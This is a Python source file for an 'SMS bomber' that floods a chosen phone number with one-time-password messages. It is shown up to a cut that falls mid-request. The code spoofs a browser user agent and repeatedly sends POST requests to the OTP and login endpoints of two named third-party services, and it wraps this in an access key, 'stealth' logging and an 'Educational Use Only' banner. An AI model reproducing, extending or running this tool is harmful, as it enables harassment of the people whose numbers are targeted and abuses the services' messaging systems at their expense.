#!/usr/bin/env python3
import requests
import time
import sys
import os
from colorama import init, Fore, Style, Back
import re
from datetime import datetime

# Initialize colorama and set up logging
init()
LOG_FILE = "sycho_log.txt"

# Constants
KEY = "Sycho"  # Secure access key
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"

# Function to initialize or append to log file
def log_action(message):
    """Log actions to a file for stealth tracking."""
    with open(LOG_FILE, "a") as log:
        log.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

# Function to validate phone number
def is_valid_phone(phone):
    """Validate phone number with regex for professional input handling."""
    return bool(re.match(r'^\+?\d{10,15}$', phone))

# Function to display the fixed ASCII art banner with SYCHO
def display_banner():
    """Display a custom ASCII art banner with SYCHO prominently below."""
    banner = f"""
{Back.BLACK + Fore.RED + Style.BRIGHT}/**
{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.YELLOW + Style.BRIGHT}* *{Fore.YELLOW} oooooooo8 ooooo  oooo oooooooo8 ooooo ooooo  ooooooo   *
{Back.BLACK + Fore.GREEN + Style.BRIGHT}* *{Fore.GREEN}888          888  88 o888     88  888   888 o888   888o *
{Back.BLACK + Fore.CYAN + Style.BRIGHT}* *{Fore.CYAN} 888oooooo     888   888          888ooo888 888     888 *
{Back.BLACK + Fore.MAGENTA + Style.BRIGHT}* *{Fore.MAGENTA}        888    888   888o     oo  888   888 888o   o888 *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *{Fore.RED}o88oooo888    o888o   888oooo88  o888o o888o  88ooo88   *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
{Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
{Back.BLACK + Fore.RED + Style.BRIGHT}   ____  _   _ _________ _       
{Back.BLACK + Fore.RED + Style.BRIGHT}  / ___|| | | |__  / ___| |___  
{Back.BLACK + Fore.RED + Style.BRIGHT}  \___ \| |_| | / /| |   | / __| 
{Back.BLACK + Fore.RED + Style.BRIGHT}   ___) |  _  |/ /_| |___| \__ \ 
{Back.BLACK + Fore.RED + Style.BRIGHT}  |____/|_| |_|____\____|_|___/
{Back.BLACK + Fore.RED}═══════════════════════════════════════
{Back.BLACK + Fore.RED}         SYCHO SMS BOMBER v2.6
{Back.BLACK + Fore.RED}═══════════════════════════════════════
{Back.BLACK + Fore.RED + Style.DIM}   Coded by SychoX2006 - 2025       {Style.RESET_ALL}
{Back.BLACK + Fore.RED + Style.DIM}   Purpose: Advanced OTP Testing    {Style.RESET_ALL}
{Back.BLACK + Fore.RED + Style.DIM}   ⚠️ Educational Use Only!         {Style.RESET_ALL}
{Back.BLACK + Fore.RED}═══════════════════════════════════════
{Style.RESET_ALL}"""
    print(banner)
    log_action("Banner displayed. Operation initialized.")

# Function to check access key with anti-brute-force delay
def check_key():
    """Authenticate with a secure key check and delay on failure."""
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        print(f"{Fore.RED}🔑 Enter Access Key: {Style.RESET_ALL}")
        key_input = input().strip()
        if key_input == KEY:
            print(f"{Fore.GREEN}✅ Access Granted! Welcome, Sycho.{Style.RESET_ALL}")
            log_action("Access granted successfully.")
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}❌ Invalid Key! {remaining} attempts remaining.{Style.RESET_ALL}")
            log_action(f"Failed login attempt {attempts}/{max_attempts}.")
            time.sleep(2 ** attempts)  # Exponential backoff (2s, 4s, 8s)
    print(f"{Fore.RED}🔒 Max attempts reached. Exiting.{Style.RESET_ALL}")
    log_action("Max login attempts exceeded. Operation terminated.")
    sys.exit(1)

# Function to send OTPs with advanced tracking
def send_otp(phone, count):
    """Deploy OTPs with professional-grade error handling and logging."""
    if not is_valid_phone(phone):
        print(f"{Fore.RED}📵 Invalid phone number! Use +923xxxxxxxxx format.{Style.RESET_ALL}")
        log_action(f"Invalid phone number: {phone}")
        return
    if not isinstance(count, int) or count < 1 or count > 100:
        print(f"{Fore.RED}❌ OTP count must be 1-100.{Style.RESET_ALL}")
        log_action(f"Invalid OTP count: {count}")
        return

    print(f"{Fore.YELLOW}💥 Initiating covert OTP deployment...{Style.RESET_ALL}")
    log_action(f"Starting OTP deployment for {phone} with count {count}.")
    success_count = 0
    for i in range(count):
        try:
            headers = {"User-Agent": USER_AGENT}
            if i % 2 == 0:
                url = f"https://bajao.pk/api/v2/login/generatePin?uuid={phone}"
                response = requests.post(url, headers=headers)
            else:
                url = "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage"
                payload = {
                    "Version": "V1",
                    "Language": "en",
                    "Platform": "web",
                    "ProductId": 1733,
                    "MobileNo": phone,
                    "OperatorId": "100007",
                    "URL
